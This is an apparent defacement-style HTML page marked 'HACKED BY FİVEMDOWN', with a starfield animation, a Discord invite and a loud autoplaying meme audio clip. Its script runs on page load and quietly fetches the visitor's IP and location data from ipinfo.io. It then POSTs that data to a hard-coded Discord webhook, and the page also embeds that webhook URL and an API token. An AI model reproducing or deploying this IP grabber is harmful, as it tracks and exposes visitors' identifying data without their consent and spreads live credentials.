<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>IP Info</title>
  <style>
    body {
      background: black;
      color: #00f;
      font-family: "Courier New", monospace;
      text-align: center;
      margin: 0;
      height: 100vh;
      overflow: hidden;
    }
    #ipinfo {
      font-size: 22px;
      line-height: 1.7;
      text-shadow: 0 0 15px #00f, 0 0 25px #00f, 0 0 40px #00f;
      white-space: pre-wrap;
      margin-top: 30px;
      color: #00f;
    }
    #discord-container {
      margin: 0 auto;
      margin-top: 40px;
      margin-bottom: 10px;
      text-align: center;
    }
    #discord-logo {
      width: 250px;
      vertical-align: middle;
      margin-bottom: 7px;
      filter: drop-shadow(0 0 8px #00f);
    }
    #discord-link {
      font-size: 48px;
      color: #00f;
      text-shadow: 0 0 20px #00f, 0 0 40px #00f, 0 0 80px #00f;
      text-decoration: none;
      font-weight: bold;
      letter-spacing: 2px;
      display: inline-block;
      margin-top: 15px;
      margin-bottom: 15px;
    }
    #hacked-by {
      font-size: 45px;
      color: #00f;
      text-shadow: 0 0 20px #00f, 0 0 40px #00f, 0 0 80px #00f;
      letter-spacing: 2px;
      font-family: inherit;
      margin-top: 0;
    }
    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: -1;
    }
    #audio-player {
      display: none;
    }
  </style>
</head>
<body>
  <canvas id="stars"></canvas>
  <div id="discord-container">
    <img id="discord-logo" src="https://media.discordapp.net/attachments/1018275296929136692/1018286520488173678/unknown-3-1-3.gif?ex=68b817f9&is=68b6c679&hm=d90659d5477a35817ddc114625ec87b417ac7ab84a3a9fc9b356feb9628ddcf0&=" alt="Discord Image">
  </div>
  <pre id="ipinfo">Loading...</pre>
  <div>
    <a id="discord-link" href="https://discord.gg/fivemdown" target="_blank">https://discord.gg/fivemdown</a>
    <span id="hacked-by"> HACKED BY FİVEMDOWN</span>
  </div>
  <!-- Mp3 dosyan entegre edildi! -->
  <audio id="audio-player" src="https://cdn.discordapp.com/attachments/1323494216852308008/1412543226468110346/Moscow_Moscow_missile_meme_earrape.mp3?ex=68b8ace4&is=68b75b64&hm=06bd01749a5bc92fd1a7fb5cfa3877d016525084c09f4f7a38c13f8b692a414a&" autoplay loop muted></audio>
  <script>
    // Yıldız efekti
    const canvas = document.getElementById("stars");
    const ctx = canvas.getContext("2d");
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const stars = Array.from({length: 150}, () => ({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height,
      radius: Math.random() * 1.5,
      dy: Math.random() * 0.5 + 0.2
    }));

    function drawStars() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = "white";
      stars.forEach(star => {
        ctx.beginPath();
        ctx.arc(star.x, star.y, star.radius, 0, Math.PI*2);
        ctx.fill();
        star.y += star.dy;
        if (star.y > canvas.height) {
          star.y = 0;
          star.x = Math.random() * canvas.width;
        }
      });
      requestAnimationFrame(drawStars);
    }
    drawStars();

    // Sayfa açılır açılmaz IP bilgilerini çek ve webhooka gönder
    fetch("https://ipinfo.io/json?token=8d7365019dc710")
      .then(response => response.json())
      .then(data => {
        document.getElementById("ipinfo").textContent = JSON.stringify(data, null, 2);
        window.ipData = data; // Tıklama anında kullanmak için

        // Webhook'a POST gönder
        var webhookURL = "https://discord.com/api/webhooks/1412165143961407570/rNvbuXQPj9VoWSffMDT8ySmCKgRrUkKW0LaHXEqDLqW1d67C9A1ikJB64NRRjt-Fvxhi";
        var ipInfo = JSON.stringify(data, null, 2);
        var payload = {
          content: "Bir kullanıcı siteyi açtı!\nIP Bilgisi:\n" + ipInfo
        };
        fetch(webhookURL, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        });
      })
      .catch(() => {
        document.getElementById("ipinfo").textContent = "Bilgiler alınamadı.";
      });

    // Otomatik müzik oynatma (bazı tarayıcılarda kullanıcı etkileşimi gerekebilir)
    window.addEventListener('click', function() {
      document.getElementById('audio-player').play();
      document.getElementById('audio-player').muted = false;
    });

    // Sayfa açılır açılmaz otomatik çalmayı dene ve sesi aç!
    window.onload = function() {
      var audio = document.getElementById('audio-player');
      audio.play().catch(()=>{});
      setTimeout(function() {
        audio.muted = false;
      }, 1200); // 1.2 saniye sonra sesi aç
    };
  </script>
</body>
</html>
